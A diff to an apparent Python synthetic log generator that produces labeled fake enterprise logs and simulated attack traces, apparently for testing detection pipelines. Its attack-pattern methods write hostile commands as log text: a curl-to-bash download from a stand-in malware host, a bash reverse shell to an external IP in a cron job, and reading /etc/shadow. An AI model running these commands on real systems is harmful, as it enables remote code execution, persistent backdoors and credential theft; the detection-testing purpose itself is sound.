@@ -29,7 +29,7 @@ class EnterpriseLogGenerator:
         # --- FIXED: Ensure the 'meta' directory exists ---
         os.makedirs(os.path.dirname(self.destinations["ground_truth"]), exist_ok=True)
 
-    def write(self, category, log, intent="background", outcome="success", trace_id=None):
+    def write(self ,category, log, intent="background", outcome="success", trace_id=None):
         # 1. Write the raw log to the file (what Vector sees)
         target_file = self.destinations.get(category)
         with open(target_file, "a") as f:
@@ -53,7 +53,7 @@ class EnterpriseLogGenerator:
     def _get_class_uid(self, category):
         return {"http": 4002, "auth": 3002, "network": 4001, "system": 1007, "api": 6003}.get(category, 0)        
     
-    def gen_4002_http(self, ip=None, status=None, path=None, intent="background", trace_id=None):
+    def gen_4002_http(self, ip=None, status=None, path=None, host=None, intent="background", trace_id=None):
 
         trace_id = trace_id or uuid.uuid4().hex[:8]
         ts = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
@@ -71,20 +71,21 @@ class EnterpriseLogGenerator:
         outcome_str = "success" if str(status).startswith(("2", "3")) else "failure"
         self.write("http", log, intent=intent, outcome=outcome_str, trace_id=trace_id)
 
-    def gen_4001_network(self, action=None, src_ip=None, dst_ip=None, dst_port=None, intent="background"):
+    def gen_4001_network(self, action=None, src_ip=None, dst_ip=None, dst_port=None, host=None, intent="background"):
         action = action or random.choices(["ALLOW", "DENY"], weights=[85, 15])[0]
         src = src_ip or random.choice(self.internal_ips)
         dst = dst_ip or f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+        host = host or 'fw-core-01'
         port = dst_port or random.choice([80, 443, 22, 3306, 5432, 8080, 27017])
         
         ts = datetime.now().isoformat()
-        log = f'{ts} fw-core-01 filter: {action} TCP {src}:{random.randint(30000, 65000)} -> {dst}:{port} (policy: Default_Drop)'
+        log = f'{ts} {host} filter: {action} TCP {src}:{random.randint(30000, 65000)} -> {dst}:{port} (policy: Default_Drop)'
         self.write("network", log, intent=intent, outcome=action.lower())
 
-    def gen_3002_auth(self, success=True, user=None, ip=None, intent="background"):
+    def gen_3002_auth(self, success=True, user=None, ip=None, host=None ,intent="background"):
         user = user or random.choice(self.users)
         ip = ip or random.choice(self.internal_ips)
-        host = random.choice(self.hosts)
+        host = host or random.choice(self.hosts)
         ts = datetime.now().strftime("%b %d %H:%M:%S")
         
         msg = "Accepted password" if success else "Failed password"
@@ -94,9 +95,10 @@ class EnterpriseLogGenerator:
         outcome_str = "success" if success else "failure"
         self.write("auth", log, intent=intent, outcome=outcome_str)
 
-    def gen_3001_account_change(self, user=None, action_type=None, intent="background"):
+    def gen_3001_account_change(self, user=None, action_type=None, host=None, intent="background"):
         ts = datetime.now().strftime("%b %d %H:%M:%S")
         user = user or random.choice(self.users)
+        host = host or "dc-01"
         
         if action_type == "add":
             log_msg = f"useradd[{random.randint(100, 999)}]: new user added - name={user}"
@@ -107,20 +109,20 @@ class EnterpriseLogGenerator:
             suffix = f"new user added - name={user}_{random.randint(1,100)}" if act == "useradd" else f"password changed for {user}"
             log_msg = f"{act}[{random.randint(100, 999)}]: {suffix}"
 
-        log = f'{ts} dc-01 {log_msg}'
+        log = f'{ts} {host} {log_msg}'
         self.write("auth", log, intent=intent, outcome="success")
 
-    def gen_1006_scheduled_job(self, cmd=None, user="root", intent="background"):
+    def gen_1006_scheduled_job(self, cmd=None, user="root", host=None, intent="background"):
         ts = datetime.now().strftime("%b %d %H:%M:%S")
-        host = random.choice(self.hosts)
+        host = host or random.choice(self.hosts)
         task = cmd or random.choice(DATA_POOLS["cron_tasks"])
         
         log = f'{ts} {host} cron[{random.randint(100, 999)}]: ({user}) CMD ( {task} )'
         self.write("system", log, intent=intent, outcome="success")
 
-    def gen_1007_process_activity(self, proc_name=None, intent="background"):
+    def gen_1007_process_activity(self, proc_name=None, host=None, intent="background"):
         ts = datetime.now().strftime("%b %d %H:%M:%S")
-        host = random.choice(self.hosts)
+        host = host or random.choice(self.hosts)
         
         if proc_name:
             msg = f"kernel: process {proc_name} started with pid {random.randint(1000,9999)}"
@@ -162,11 +164,22 @@ class EnterpriseLogGenerator:
         with open(metric_path, "a") as f:
             f.write(json.dumps(metric_doc) + "\n")
 
-    def simulate_metric_spike(self, host, duration_steps=5):
-        """Generates several high-value metric points to simulate a resource spike."""
+    def simulate_metric_spike(self, host, attack_type="generic", duration_steps=5):
+        """Generates high-value metric points using standard unit names."""
         for _ in range(duration_steps):
-            self.gen_metric(host, "cpu_usage", random.uniform(85.0, 99.0), tags={"status": "anomaly"})
-            self.gen_metric(host, "mem_usage", random.uniform(80.0, 95.0), tags={"status": "anomaly"})
+            if attack_type == "exfiltration":
+                # High Network and Disk usage
+                self.gen_metric(host, "network_io_kbs", random.uniform(10000.0, 50000.0), tags={"status": "anomaly"})
+                self.gen_metric(host, "cpu_usage_pct", random.uniform(20.0, 40.0))
+            elif attack_type == "web_dos":
+                # High CPU and Network usage
+                self.gen_metric(host, "cpu_usage_pct", random.uniform(70.0, 95.0), tags={"status": "anomaly"})
+                self.gen_metric(host, "network_io_kbs", random.uniform(5000.0, 15000.0))
+            else:
+                # Generic high-load (Malware/Mining)
+                self.gen_metric(host, "cpu_usage_pct", random.uniform(85.0, 99.0), tags={"status": "anomaly"})
+                self.gen_metric(host, "mem_usage_pct", random.uniform(80.0, 95.0), tags={"status": "anomaly"})
+            
             time.sleep(0.1)
 
     def background_all_metrics(self):
@@ -188,23 +201,22 @@ class EnterpriseLogGenerator:
         random.choice(funcs)()
 
     def attack_pattern_persistence(self, attacker_ip="45.33.22.11"):
-        print(f"💀 Simulating Persistence Attack from {attacker_ip}...")
 
         target_host = random.choice(self.hosts)
-        print(f"Persistence attack on {target_host} from {attacker_ip}")
+        print(f"💀 Simulating Persistence Attack on {target_host} from {attacker_ip}...")
 
         self.gen_4002_http(ip=attacker_ip, path="/cgi-bin/vulnerable.sh", status="200", intent="exploitation")
-        self.simulate_metric_spike(target_host)
+        self.simulate_metric_spike(target_host, attack_type="generic")
         time.sleep(0.5)
-        self.gen_1007_process_activity(proc_name="curl http://malware.com/shell | bash", intent="execution")
+        self.gen_1007_process_activity(proc_name="curl http://malware.com/shell | bash",host=target_host ,intent="execution")
         time.sleep(0.5)
-        self.gen_3001_account_change(user="backdoor_user", action_type="add", intent="persistence")
+        self.gen_3001_account_change(user="backdoor_user", action_type="add", host=target_host ,intent="persistence")
         time.sleep(0.5)
-        self.gen_1006_scheduled_job(cmd="/bin/bash -i >& /dev/tcp/45.33.22.11/443 0>&1", user="backdoor_user", intent="persistence")
+        self.gen_1006_scheduled_job(cmd="/bin/bash -i >& /dev/tcp/45.33.22.11/443 0>&1", user="backdoor_user",host=target_host, intent="persistence")
 
     def attack_pattern_webapp(self, target_ip =None):
         target_host = random.choice(self.hosts)
-        self.gen_metric(target_host, "cpu_usage", random.uniform(40.0, 60.0), tags={"status": "suspicious"})
+        self.gen_metric(target_host, "cpu_usage_pct", random.uniform(40.0, 60.0), tags={"status": "suspicious"})
 
         target_ip = target_ip or random.choice(self.internal_ips)
         attacker_ip = f"192.168.1.{random.randint(2,254)}"
@@ -220,16 +232,18 @@ class EnterpriseLogGenerator:
 
     def attack_pattern_distributed_exploit(self):
         attacker_ip = f"185.220.101.{random.randint(1,254)}"
+        target_host = random.choice(self.hosts)
         op_trace = uuid.uuid4().hex[:12]
         print(f"Simulating Distributed Attack Trace: {op_trace}")
 
-        self.gen_4001_network(src_ip=attacker_ip, action="ALLOW", intent="recon", dst_port=443)
-        self.gen_4002_http(ip=attacker_ip, path="/api/v1/debug", status="200", intent="exploitation", trace_id=op_trace)
+        self.gen_4001_network(src_ip=attacker_ip, action="ALLOW", intent="recon", host=target_host, dst_port=443)
+        self.simulate_metric_spike(target_host, attack_type="exfiltration")
+        self.gen_4002_http(ip=attacker_ip, path="/api/v1/debug", status="200", host=target_host, intent="exploitation", trace_id=op_trace)
         time.sleep(0.2)
 
         self.gen_6003_api(endpoint="/v2/internal/config", status=200, intent="exploitation", trace_id=op_trace)
         time.sleep(0.2)
-        self.gen_1007_process_activity(proc_name=f"sh -c 'cat /etc/shadow' [trace:{op_trace}]", intent="exfiltration")
+        self.gen_1007_process_activity(proc_name=f"sh -c 'cat /etc/shadow' [trace:{op_trace}]", host=target_host, intent="exfiltration")
 
 
 
